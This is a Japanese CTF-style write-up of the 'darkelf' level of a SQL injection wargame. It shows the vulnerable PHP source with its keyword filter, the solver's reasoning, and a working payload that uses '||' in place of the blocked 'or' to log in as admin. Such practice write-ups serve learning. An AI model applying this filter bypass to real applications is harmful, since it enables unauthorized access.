# darkelf

## answer

```
https://los.eagle-jump.org/darkelf_6e50323a0bfccc2f3daf4df731651f75.php?pw=1%27%7C%7Cid=%27admin
```

## problem

```
<?php 
  include "./config.php"; 
  login_chk(); 
  dbconnect();  
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~"); 
  if(preg_match('/or|and/i', $_GET[pw])) exit("HeHe"); 
  $query = "select id from prob_darkelf where id='guest' and pw='{$_GET[pw]}'"; 
  echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
  $result = @mysql_fetch_array(mysql_query($query)); 
  if($result['id']) echo "<h2>Hello {$result[id]}</h2>"; 
  if($result['id'] == 'admin') solve("darkelf"); 
  highlight_file(__FILE__); 
?>
```

## memo

寝起きで早朝に取り組んでいる。

さて、試しに、

```
https://los.eagle-jump.org/darkelf_6e50323a0bfccc2f3daf4df731651f75.php?pw=1
```

とすると

```
query : select id from prob_darkelf where id='guest' and pw='1'
```

となった。

コードを読んでいく。

```
if(preg_match('/or|and/i', $_GET[pw])) exit("HeHe"); 
```

とあるので、orとand、ORとANDは禁止されている。

昨日もこれを使った気がするが、orの代わりに||を使ってみる。

```
if($result['id'] == 'admin') solve("darkelf"); 
```

クリア条件はこれなので、

```
?pw=1'||id='admin
```

これでいけた。

```
https://los.eagle-jump.org/darkelf_6e50323a0bfccc2f3daf4df731651f75.php?pw=1%27%7C%7Cid=%27admin
```

```
query : select id from prob_darkelf where id='guest' and pw='1'||id='admin'
```

## references

- [preg_match | php manual](https://www.php.net/manual/ja/function.preg-match.php)

- [mysql_fetch_array | php manual](https://www.php.net/manual/ja/function.mysql-fetch-array.php)

- [mysql_query | php manual](https://www.php.net/manual/ja/function.mysql-query.php)

- [highlight_file | php manual](https://www.php.net/manual/ja/function.highlight-file.php)